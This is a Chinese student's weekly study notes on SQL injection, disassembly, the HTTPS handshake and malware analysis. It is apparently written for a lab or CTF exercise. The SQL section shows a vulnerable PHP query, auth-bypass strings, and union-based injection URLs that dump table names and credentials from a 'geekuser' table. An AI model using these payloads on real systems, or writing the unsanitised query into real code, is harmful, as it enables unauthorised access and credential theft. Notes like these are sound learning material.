# week2-20240916-20240922

sql注入

sql注入，本质上是因为数据库操作过程中没有对用户的输入进行过滤，而是将输入直接作为参数来执行sql语句。

例如：
$name=$_POST['username'];
$pass=$_POST['password'];
$sql="SELECT * FROM users WHERE name='$name' and pass='$pass'";

在以上语句中，如果name为admin，password为' or '1'='1，最后的sql语句就会变成：

SELECT * FROM users WHERE name='admin' and pass='' or '1' = '1'

一个合法的逻辑表达式。那么最后sql就会注入成功


信息收集：尝试输入一些单引号，看看有没有报错，判断数据库类型、字符型注入还是数字型注入。报错信息常常会提供很有价值的提示

字符型：SELECT * FROM user WHERE name = 'Fin'
数字型：SELECT * FROM user WHERE id = 1
两者最大的区别在于：数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合


常用的注入语句：
' or '1' = '1 
' or 1=1 --' 
' or 1=1#

#可以将后面的语句都注释掉。因此需要进行字符转义

在sql爆破成功之后，可以判断是否有回显点，就是password这个字段可以显示查询的结果

找到回显点位之后，可以去查询有哪些表格

/check.php?username=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&password=1

查到表格之后，可以去查询表格中有哪些字段

/check.php?username=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='geekuser'%23&password=1

查到字段之后，可以去查询表格中有哪些数据

/check.php?username=1' union select 1,2,group_concat(id,username,password) from geekuser%23&password=1


sqlmap 据说很好用的爆破数据库工具，但是我暂时用不太来。



# 漏洞分析基础

# 代码反分析

关于反汇编算法

1. 线性扫描方法

先将二进制解码为汇编指令，然后顺序读取
永远都会扫描所有的指令

2. 递归下降方法


然后讲了一些干扰逆向的方法


# http原理

参考：

https://blog.csdn.net/hguisu/article/details/8680808/

非对称加密很耗时，不可能对实际的数据都非对称加密来传输。HTTPS采用的是处理信息的方式是：结合对称加密+非对称加密这两种方式。我们可以用非对称加密的方式来传输对称加密过程中的密钥，之后我们就可以采取对称加密的方式来传输数据了。

简单工作过程如下：

1、客户端请求公钥：服务器用明文的方式给客户端发送自己的公钥（对应的私钥还在服务端手上，没有泄露）。

支持TLS/SSL协议版本，比如TLS 1.0版
一个客户端生成的随机数ClientRnd (第1个随机数)，稍后用于生成”对话密钥”
支持的加密算法，比如RSA公钥加密
支持的压缩方法

2、客户端生成随机数密钥：客户端收到公钥之后，会生成一个随机数密钥(对称加密用的)，然后用服务器的公钥对这把随机数密钥进行加密，之后再把随机数密钥传输给服务器。

server_hello：服务端返回协商的信息结果，包括选择使用的协议版本 version，选择的加密套件 cipher suite，选择的压缩算法 compression method、随机数 ServerRnd等，其中随机数用于后续的密钥协商;
server_certificates：服务器端配置对应的证书链，用于身份验证与密钥交换;
server_hello_done：通知客户端 server_hello 信息发送结束;

确认使用的加密通信协议版本，比如TLS 1.0版本。如果浏览器与服务器支持的版本不一致，服务器关闭加密通信
一个服务器生成的随机数ServerRnd(第2个随机数)，稍后用于生成”对话密钥”
确认使用的加密算法，比如RSA公钥加密
服务器证书：证书包含服务器信息：域名/服务地址、公钥、证书的CA
                        

3、服务器使用私钥解密随机数密钥：服务器收到随机数密钥之后用私钥解密得到随机数解密，此时，客户端和服务端都拥有了这个随机数密钥，并且它没有被泄露。即使黑客截取了公钥或者加密后的随机数都无法解密（因为公钥加密的随机数只能用私钥解密）

生成随机数(对称秘钥PreMasterSecret ，第3个随机数):：客户端并使用证书带的公钥将 PreMasterSecret 进行加密.  它是客户端使用一些加密算法(例如：RSA, Diffie-Hellman)产生一个48个字节的Key，这个Key叫 PreMaster Secret，很多材料上也被称作 PreMaster Key。
编码改变通知ChangeCipherSpec: 表示随后的信息都将用双方商定的加密算法和密钥发送
ClientHash 值： 通过之前交换的数据(前面发送的所有内容)生成一个 ClientHash 值,用来供服务器校验。
客户端握手结束通知，表示客户端的握手阶段已经结束。


4、对称加密传输：最后服务器安全得到这把随机数密钥了，而客户端也有同样一把随机数密钥，他们就可以进行对称加密传输数据了。

4.1. 使用自己证书的私钥解密出 PreMasterSecret
4.2. 生成SessionSecret：服务端根据之前的随机数（ClientRnd ，ServerRnd，PreMasterSecret ）和约定的加密算法，生成用于加密后续传输数据的会话密钥 SessionSecret。

enc_key=Fuc(ClientRnd, ServerRnd, PreMasterSecret )

4.3.校验 clientHash （确认不是假的客户端）和密钥SessionSecret正确性：

计算之前所有接收信息的 hash 值，即为serverHash。然后解密客户端发送encrypted_handshake_message的ClientHash，验证数据和密钥正确性（即serverHash ==ClientHash  是否为true）；

4.4. Change Cipher Spec确认变更编码:  会给客户端发送一个 ChangeCipherSpec，告知客户端已经切换到协商过的加密套件状态，准备使用加密套件和 Session Secret加密数据了。
4.5. Encrypted Handshake Message Finish信息：服务器也结合所有当前的通信参数信息生成一段Finish消息数据，并采用协商密钥SessionSecret  与算法加密并发送到客户端， 以验证之前通过握手建立起来的加解密通道是否成功。


# 恶意代码分析与检测

文件格式识别、字符串提取、二进制结构分析、反汇编、反编译、代码保护技术分析、代码结构与逻辑分析等

使用readelf、PEiD等工具解析二进制文件格式。

使用IDA解析导入表、导出表、调试信息，提取可疑API信息、 路径泄露信息等
使用IDA实施反汇编与反编译，结合汇编代码与伪代码分析恶意行为。

可以做这个分析是因为，不同恶意代码在代码结构、API调用等方面可能具有相似性。

（后面的没什么意思，不想看了）



